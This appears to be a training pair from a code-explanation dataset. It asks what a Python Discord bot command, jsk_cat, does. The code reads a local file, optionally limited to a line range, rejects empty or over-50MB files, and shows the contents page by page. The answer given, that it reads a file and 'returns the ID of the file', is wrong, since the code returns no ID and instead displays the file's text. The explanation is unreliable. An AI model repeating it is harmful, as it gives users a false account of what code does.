{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\nasync def jsk_cat(self, ctx: commands.Context, argument: str):\n\n        match = self.__cat_line_regex.search(argument)\n\n        if not match:  # should never happen\n            return await ctx.send(\"Couldn't parse this input.\")\n\n        path = match.group(1)\n\n        line_span = None\n\n        if match.group(2):\n            start = int(match.group(2))\n            line_span = (start, int(match.group(3) or start))\n\n        if not os.path.exists(path) or os.path.isdir(path):\n            return await ctx.send(f\"`{path}`: No file by that name.\")\n\n        size = os.path.getsize(path)\n\n        if size <= 0:\n            return await ctx.send(f\"`{path}`: Cowardly refusing to read a file with no size stat\"\n                                  f\" (it may be empty, endless or inaccessible).\")\n\n        if size > 50 * (1024 ** 2):\n            return await ctx.send(f\"`{path}`: Cowardly refusing to read a file >50MB.\")\n\n        try:\n            with open(path, \"rb\") as file:\n                paginator = WrappedFilePaginator(file, line_span=line_span, max_size=1985)\n        except UnicodeDecodeError:\n            return await ctx.send(f\"`{path}`: Couldn't determine the encoding of this file.\")\n        except ValueError as exc:\n            return await ctx.send(f\"`{path}`: Couldn't read this file, {exc}\")\n\n        interface = PaginatorInterface(ctx.bot, paginator, owner=ctx.author)\n        await interface.send_to(ctx)", "response": "Read out a file and return the ID of the file."}
